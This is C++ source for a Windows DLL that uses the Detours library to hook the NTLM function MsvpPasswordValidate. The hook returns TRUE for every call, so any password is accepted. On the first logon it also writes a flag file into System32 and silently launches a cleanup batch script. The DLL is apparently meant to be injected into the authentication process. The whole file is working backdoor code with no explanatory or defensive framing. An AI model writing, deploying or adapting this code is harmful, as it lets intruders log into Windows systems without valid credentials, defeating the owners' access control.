#include "pch.h"
#include <Windows.h>
#include <SubAuth.h>
#include "detours.h"
#pragma comment(lib, "detours.lib")
#include <WtsApi32.h>
#pragma comment(lib, "Wtsapi32.lib")

#define DP(x)

typedef BOOLEAN(WINAPI* pMsvpPasswordValidate)(BOOLEAN UasCompatibilityRequired,
	NETLOGON_LOGON_INFO_CLASS LogonLevel,
	PVOID LogonInformation,
	void* Passwords,
	PULONG UserFlags,
	PUSER_SESSION_KEY UserSessionKey,
	PVOID LmSessionKey);

pMsvpPasswordValidate MsvpPasswordValidate = nullptr;
volatile LONG g_HookStarted = 0;
volatile LONG g_CleanupStarted = 0;

static void TouchAuthSeenFlag()
{
	DWORD written = 0;
	const char marker[] = "auth\r\n";
	HANDLE file = CreateFileW(
		L"C:\\Windows\\System32\\GA_AuthSeen.flag",
		GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		nullptr,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		nullptr);

	if (file != INVALID_HANDLE_VALUE)
	{
		WriteFile(file, marker, sizeof(marker) - 1, &written, nullptr);
		CloseHandle(file);
	}
}

static void StartCleanup()
{
	STARTUPINFOW startupInfo;
	PROCESS_INFORMATION processInfo;
	wchar_t commandLine[] = L"C:\\Windows\\System32\\cmd.exe /c C:\\Windows\\System32\\GrabAccessCleanup.bat postauth";

	ZeroMemory(&startupInfo, sizeof(startupInfo));
	ZeroMemory(&processInfo, sizeof(processInfo));
	startupInfo.cb = sizeof(startupInfo);

	if (CreateProcessW(
		nullptr,
		commandLine,
		nullptr,
		nullptr,
		FALSE,
		CREATE_NO_WINDOW,
		nullptr,
		nullptr,
		&startupInfo,
		&processInfo))
	{
		CloseHandle(processInfo.hThread);
		CloseHandle(processInfo.hProcess);
	}
}

BOOLEAN HookMSVPPValidate(BOOLEAN UasCompatibilityRequired,
	NETLOGON_LOGON_INFO_CLASS LogonLevel,
	PVOID LogonInformation,
	void* Passwords,
	PULONG UserFlags,
	PUSER_SESSION_KEY UserSessionKey,
	PVOID LmSessionKey)
{
	if (InterlockedCompareExchange(&g_CleanupStarted, 1, 0) == 0)
	{
		TouchAuthSeenFlag();
		StartCleanup();
	}
	return TRUE;
}


int InstallMsvpHook()
{
	DWORD Err = 0;
	HMODULE NtlmShared = LoadLibrary(L"NtlmShared.dll");

	if (NtlmShared == NULL)
	{
		DP("Error loading NtlmShared");
		return 1;
	}

	MsvpPasswordValidate = (pMsvpPasswordValidate)GetProcAddress(NtlmShared, "MsvpPasswordValidate");

	if (MsvpPasswordValidate == NULL)
	{
		DP("Error locating MsvpPasswordValidate");
		return 1;
	}

	DP("Found MsvpPasswordValidate!");

	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(PVOID&)MsvpPasswordValidate, HookMSVPPValidate);
	Err = DetourTransactionCommit();
	if (Err != NO_ERROR)
	{
		DP("Failed to hook MsvpPasswordValidate!");
	}
	DP("Hooked MsvpPasswordValidate successfully!");
	return 0;
}

int InstallMsvpHookOnce()
{
	if (InterlockedCompareExchange(&g_HookStarted, 1, 0) != 0)
	{
		return 0;
	}
	return InstallMsvpHook();
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		DisableThreadLibraryCalls(hModule);
		InstallMsvpHookOnce();
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
